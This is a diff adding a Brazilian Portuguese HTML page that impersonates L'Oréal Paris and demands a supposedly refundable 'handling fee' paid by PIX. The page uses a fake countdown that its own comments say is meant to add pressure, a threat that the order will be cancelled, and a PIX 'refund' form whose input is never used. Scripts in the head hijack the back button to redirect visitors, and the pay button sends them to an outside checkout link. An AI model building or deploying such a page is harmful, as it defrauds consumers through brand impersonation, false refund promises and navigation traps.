@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>L'Oréal Paris - Regularização de Carga</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <script>
+        window.pixelId = "699052447f0cf151dff45c39";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script>
+        (function() {
+            const KEY = '__qs_entry__';
+            try {
+                if (!sessionStorage.getItem(KEY)) {
+                    sessionStorage.setItem(KEY, window.location.search || '');
+                }
+            } catch (e) {}
+            history.replaceState({ backtrap: 'root' }, '', location.pathname + (location.search || '') + location.hash);
+            history.pushState({ backtrap: 'guard' }, '');
+            
+            window.addEventListener('popstate', function(ev) {
+                const st = ev.state || history.state;
+                if (!st || st.backtrap !== 'root') return;
+                let qs = '';
+                try {
+                    qs = location.search || sessionStorage.getItem(KEY) || '';
+                    if (qs && qs[0] !== '?') qs = '?' + qs;
+                } catch (e) {}
+                // Redirecionamento direto sem pop-up
+                location.replace('/elseve/up/1/back2' + (qs || ''));
+            });
+        })();
+    </script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>    
+    
+    <style>
+        :root {
+            --pure-black: #000000;
+            --pure-white: #ffffff;
+            --error-red: #d93025;
+            --warning-bg: #fff5f5;
+            --success-green: #00a650;
+            --border: #E0E0E0;
+        }
+
+        body {
+            margin: 0; padding: 0;
+            font-family: 'Poppins', sans-serif;
+            background-color: #f2f2f2;
+            color: #1a1a1a;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* HEADER */
+        header {
+            padding: 20px 0;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+            background: var(--pure-white);
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+        }
+
+        /* ALERTA CRÍTICO NO TOPO */
+        .critical-alert {
+            background-color: var(--error-red);
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            animation: blink 2s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { background-color: var(--error-red); }
+            50% { background-color: #a82018; }
+        }
+
+        .main-container {
+            max-width: 460px;
+            margin: 20px auto;
+            background: var(--pure-white);
+            padding: 35px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            border-radius: 8px;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .status-badge {
+            background: var(--success-green);
+            color: #fff;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 6px 14px;
+            display: inline-block;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-radius: 4px;
+        }
+
+        h1 {
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 15px;
+            color: var(--pure-black);
+            text-transform: uppercase;
+        }
+
+        p { font-size: 13px; color: #555; line-height: 1.6; margin-bottom: 15px; }
+
+        .highlight-text {
+            background: #e8f5e9;
+            padding: 15px;
+            border-left: 4px solid var(--success-green);
+            border-radius: 4px;
+            font-size: 12px;
+            color: #2e7d32;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .warning-box {
+            background-color: var(--warning-bg);
+            border: 1px dashed var(--error-red);
+            padding: 15px;
+            font-size: 12px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+            border-radius: 4px;
+            color: var(--error-red);
+            font-weight: 600;
+        }
+
+        .order-summary {
+            border: 1px solid #eee;
+            padding: 15px;
+            margin-bottom: 25px;
+            text-align: center;
+            border-radius: 6px;
+            background: #fafafa;
+        }
+
+        .order-summary span { display: block; font-size: 11px; color: #999; margin-bottom: 5px; font-weight: 600; text-transform: uppercase;}
+        .old-price { font-size: 14px; text-decoration: line-through; color: #aaa; }
+        .new-price { font-size: 28px; font-weight: 800; color: var(--success-green); display: block; }
+
+        /* BOTOES */
+        .btn-action {
+            display: block;
+            width: 100%;
+            background: var(--pure-black);
+            color: #fff;
+            text-align: center;
+            padding: 18px;
+            border: none;
+            border-radius: 4px;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 700;
+            text-decoration: none;
+            font-size: 14px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.3s;
+            box-sizing: border-box;
+        }
+        .btn-action:hover { opacity: 0.9; }
+
+        .btn-final-disabled {
+            background: #cccccc !important;
+            color: #888888 !important;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        .btn-final-enabled {
+            background: var(--success-green) !important;
+            box-shadow: 0 4px 15px rgba(0, 166, 80, 0.4);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+
+        /* FORMULÁRIO PIX E VOLTAR (TELA 2) */
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 12px;
+            color: #666;
+            text-decoration: none;
+            font-weight: 600;
+            margin-bottom: 20px;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+        .back-btn:hover { color: var(--pure-black); }
+        .back-btn svg { width: 14px; fill: currentColor; }
+
+        .form-group { margin-bottom: 15px; text-align: left; }
+        .form-group label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 5px; color: #333; }
+        .form-control {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-family: 'Poppins', sans-serif;
+            font-size: 14px;
+            box-sizing: border-box;
+            background: #fff;
+            transition: border-color 0.2s;
+        }
+        .form-control:focus { outline: none; border-color: var(--pure-black); }
+
+        /* CAIXINHA DE TERMOS OBRIGATÓRIA */
+        .terms-box {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            background: #f9f9f9;
+            border: 1px solid #eaeaea;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            margin-top: 10px;
+        }
+        .terms-box input[type="checkbox"] {
+            margin-top: 2px;
+            transform: scale(1.2);
+            cursor: pointer;
+        }
+        .terms-box label {
+            font-size: 11px;
+            color: #444;
+            line-height: 1.4;
+            cursor: pointer;
+            margin: 0;
+            font-weight: 500;
+        }
+
+        .timer-msg {
+            text-align: center;
+            font-size: 12px;
+            margin-top: 20px;
+            color: #666;
+        }
+        #timer { font-weight: 700; color: var(--error-red); }
+
+        /* MODAL (POP-UP) */
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); z-index: 9999;
+            display: none; align-items: center; justify-content: center;
+            backdrop-filter: blur(4px);
+        }
+        .popup {
+            background: #fff; padding: 30px 20px; border-radius: 8px;
+            width: 90%; max-width: 380px; text-align: center;
+            animation: scaleUp 0.3s ease-out;
+        }
+        @keyframes scaleUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        
+        .loader-circle {
+            border: 4px solid #f3f3f3; border-top: 4px solid var(--success-green);
+            border-radius: 50%; width: 45px; height: 45px;
+            animation: spin 1s linear infinite; margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        @media (max-width: 600px) {
+            .main-container { margin: 10px; padding: 25px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">L’ORÉAL</div>
+    </header>
+    
+    <div class="critical-alert">
+        ⚠️ NÃO SAIA OU RECARREGUE ESTA PÁGINA, ISSO CAUSARÁ UM ERRO NA SUA COMPRA - ESTA ETAPA É OBRIGATÓRIA!
+    </div>
+
+    <div class="main-container" id="step-1">
+        <div class="status-badge">Atenção: Taxa Reembolsável + Desconto</div>
+        
+        <h1>Taxa de Manuseio e Embalagem</h1>
+
+        <p>Identificamos que a sua <strong>Taxa de Manuseio e Embalagem</strong> ainda não foi paga. Para evitar o cancelamento do seu kit, nós te demos um desconto exclusivo e tornamos a taxa reembolsável!</p>
+        
+        <div class="highlight-text">
+            <strong>Fique tranquilo(a):</strong> Essa etapa é apenas para validação obrigatória no sistema. Você não perderá nenhum centavo, pois o valor pago será <strong>100% reembolsado via PIX</strong> em apenas 5 minutos.
+        </div>
+
+        <div class="order-summary">
+            <span>NOVA TAXA COM DESCONTO</span>
+            <div class="old-price">De R$ 26,74</div>
+            <div class="new-price">Por R$ 21,74</div>
+        </div>
+
+        <div class="warning-box">
+            Atenção: É obrigatório concluir essa etapa. Se o sistema não validar o pagamento agora, seu pedido será cancelado e repassado para outra pessoa.
+        </div>
+
+        <button onclick="goToStep2()" class="btn-action">
+            Continuar
+        </button>
+
+        <div class="timer-msg">
+            O lote será repassado definitivamente em: <span id="timer">03:00</span>
+        </div>
+    </div>
+
+    <div class="main-container" id="step-2" style="display: none;">
+        
+        <div class="back-btn" onclick="goBackToStep1()">
+            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+            Voltar
+        </div>
+        
+        <h1>cadastro de reembolso</h1>
+        <p>Cadastre abaixo a sua chave PIX para que o sistema possa devolver seus <strong>R$ 21,74</strong> automaticamente 5 minutos após a confirmação.</p>
+
+        <div class="form-group">
+            <label for="pix-type">Tipo de Chave PIX</label>
+            <select id="pix-type" class="form-control" onchange="changePlaceholder()">
+                <option value="cpf">CPF</option>
+                <option value="telefone">Telefone / Celular</option>
+                <option value="email">E-mail</option>
+                <option value="cnpj">CNPJ</option>
+                <option value="aleatoria">Chave Aleatória</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="pix-key">Sua Chave PIX</label>
+            <input type="text" id="pix-key" class="form-control" placeholder="Digite seu CPF..." oninput="checkInputs()">
+        </div>
+
+        <div class="terms-box">
+            <input type="checkbox" id="terms-checkbox" onchange="checkInputs()">
+            <label for="terms-checkbox">Eu concordo e entendo que se digitar meu PIX com algum erro de digitação, a empresa não terá responsabilidade sobre o estorno.</label>
+        </div>
+
+        <div style="font-size: 11px; color: #888; margin-bottom: 20px; text-align: center;">
+            🔒 Validação segura. Retorno garantido em 5 minutos.
+        </div>
+
+        <button id="checkout-btn" class="btn-action btn-final-disabled">
+            Preencha os dados acima
+        </button>
+    </div>
+
+    <div class="overlay" id="redirect-modal">
+        <div class="popup">
+            <div class="loader-circle"></div>
+            <h2 style="font-size: 18px; color: var(--pure-black); margin-bottom: 10px;">Chave PIX Cadastrada!</h2>
+            <p style="font-size: 13px; color: #555; line-height: 1.5; margin-bottom: 0;">
+                Essa taxa será <strong>REEMBOLSADA</strong> após o pagamento.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // LÓGICA DE BACK-REDIRECT DIRETO SEM POP-UP
+        (function() {
+            // No evento de popstate, o navegador irá processar o back redirect
+            // via histórico manipulado no HEAD
+        })();
+
+        // TIMER REDUZIDO PARA 3 MINUTOS (MAIOR PRESSÃO)
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) timer = 0;
+            }, 1000);
+        }
+
+        // Variável global para guardar a URL final com UTMs
+        let finalCheckoutUrl = "https://app.penguimpay.com/checkout/1a669d60-056b-49a0-b693-f6ec3b39e27b";
+
+        window.onload = function() {
+            startTimer(180, document.querySelector('#timer'));
+            
+            // UTM Preserve
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.toString()) {
+                finalCheckoutUrl = finalCheckoutUrl + "?" + urlParams.toString();
+            }
+        };
+
+        // NAVEGAÇÃO ENTRE AS TELAS
+        function goToStep2() {
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-2').style.display = 'block';
+            window.scrollTo(0, 0); 
+        }
+
+        function goBackToStep1() {
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('step-1').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        // MUDA O TEXTO DE EXEMPLO DO CAMPO PIX
+        function changePlaceholder() {
+            const type = document.getElementById('pix-type').value;
+            const input = document.getElementById('pix-key');
+            
+            if(type === 'cpf') input.placeholder = "Digite seu CPF...";
+            else if(type === 'telefone') input.placeholder = "(DD) 9XXXX-XXXX";
+            else if(type === 'email') input.placeholder = "seu@email.com";
+            else if(type === 'cnpj') input.placeholder = "Digite o CNPJ...";
+            else if(type === 'aleatoria') input.placeholder = "Cole sua chave aleatória aqui...";
+            
+            checkInputs(); 
+        }
+
+        // LIBERA O BOTÃO DE CHECKOUT QUANDO DIGITADO E MARCADO O CHECKBOX
+        function checkInputs() {
+            const inputVal = document.getElementById('pix-key').value;
+            const isChecked = document.getElementById('terms-checkbox').checked;
+            const btn = document.getElementById('checkout-btn');
+
+            if(inputVal.trim().length >= 4 && isChecked) {
+                btn.classList.remove('btn-final-disabled');
+                btn.classList.add('btn-final-enabled');
+                btn.innerText = "Pagar Taxa e Liberar Pedido";
+            } else {
+                btn.classList.add('btn-final-disabled');
+                btn.classList.remove('btn-final-enabled');
+                
+                // Muda o texto dinamicamente para orientar o usuário
+                if (inputVal.trim().length < 4) {
+                    btn.innerText = "Preencha os dados acima";
+                } else if (!isChecked) {
+                    btn.innerText = "Aceite os termos para continuar";
+                }
+            }
+        }
+
+        // LÓGICA DO POPUP FINAL ANTES DE REDIRECIONAR
+        document.getElementById('checkout-btn').addEventListener('click', function(e) {
+            e.preventDefault(); // Impede de clicar caso esteja cinza
+            
+            if(this.classList.contains('btn-final-enabled')) {
+                // Mostra o pop-up
+                document.getElementById('redirect-modal').style.display = 'flex';
+                
+                // Aguarda 4 segundos e redireciona
+                setTimeout(function() {
+                    window.location.href = finalCheckoutUrl;
+                }, 4000);
+            }
+        });
+    </script>
+</body>
+</html>
